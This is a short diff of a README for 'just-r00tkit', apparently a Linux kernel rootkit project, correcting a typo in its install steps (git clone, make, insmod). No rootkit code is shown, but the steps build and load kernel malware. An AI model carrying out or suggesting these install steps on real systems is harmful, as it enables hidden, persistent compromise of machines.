@@ -12,7 +12,7 @@ just-r00tkit a kernel land rootkit for Linux kernel 5.X that can:
 
 - git clone https://github.com/justr0ma/justr00tkit.git justr00tk
 
-- cd to justr00tk && make
+- cd justr00tk && make
 
 - insmod justrootk.o
 
